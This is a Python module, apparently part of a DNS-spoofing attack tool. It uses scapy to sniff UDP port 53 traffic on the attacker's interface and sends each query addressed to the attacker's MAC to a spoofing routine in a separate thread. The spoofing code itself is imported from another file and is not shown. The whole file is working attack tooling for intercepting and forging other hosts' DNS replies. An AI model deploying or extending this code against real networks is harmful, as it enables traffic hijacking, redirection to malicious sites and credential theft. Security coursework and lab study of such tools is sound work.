from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
import sys
import os
import ipaddress
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
from dns_spoofer import *

#
# Function launching the DNS spoofing (it calls the function in another thread)
#
def launch_dns_spoofer(pkt, self_mac):

    # Starting a thread for dns_spoofer with pkt
    if(pkt[Ether].dst == self_mac):
        thread = threading.Thread(target=dns_sorting_start, args=(pkt,))
        thread.start()

#
# Function in charge of the DNS sniffing, redirecting all the DNS request to be analysed by the code.
#
def dns_sniffer(stopEvent):

    # Handler fx for stopping sniffer
    def stop_sniffer(pkt):
        return stopEvent.is_set()

    # Sniffer code
    iface = str(ATTACK_STATUS['iface'])
    self_mac = get_if_hwaddr(iface)
    print("[STARTED] DNS Sniffer")
    sniff(filter="udp port 53", prn= lambda pkt : launch_dns_spoofer(pkt, self_mac), iface=iface, stop_filter=stop_sniffer)